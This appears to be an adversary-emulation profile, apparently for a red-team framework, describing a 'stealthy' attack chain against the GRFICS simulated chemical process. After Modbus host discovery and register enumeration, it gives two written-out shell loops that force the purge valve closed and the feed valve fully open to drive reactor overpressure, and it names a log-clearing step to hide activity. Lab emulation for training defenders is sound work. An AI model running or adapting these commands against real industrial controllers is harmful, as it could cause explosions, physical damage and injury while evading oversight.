ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.description: Scan the ICS process network for live Modbus hosts
steps.name: Nmap ICS Subnet Discovery

steps.description: Read input registers from all 6 Modbus devices to map the process
steps.name: Modbus - Enumerate All Process I/O

steps.name: Modbus - Read Tank Pressure and Level

steps.command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  sleep 0.1;done
steps.plaintext_command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  sleep 0.1;done
steps.description:
Write holding register 1 on Purge device (192.168.95.12) to 0,
forcing the purge valve fully closed. This traps gas in the reactor,
causing pressure to build.
steps.name: Modbus - Close Purge Valve

steps.command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.1;done
steps.plaintext_command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.1;done
steps.description:
Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
forcing maximum inflow. Combined with purge closure, this rapidly
increases reactor pressure.
steps.name: Modbus - Force Feed 1 Valve Open

adversary.name: ICS Pressure Manipulation Adversary
adversary.description:
Stealthy attack chain targeting the GRFICS chemical process.
Discovers ICS network, enumerates Modbus devices, reads process state,
then manipulates valves to cause reactor overpressure.

objectives.name: default
objectives.description: This is a default objective that runs forever.
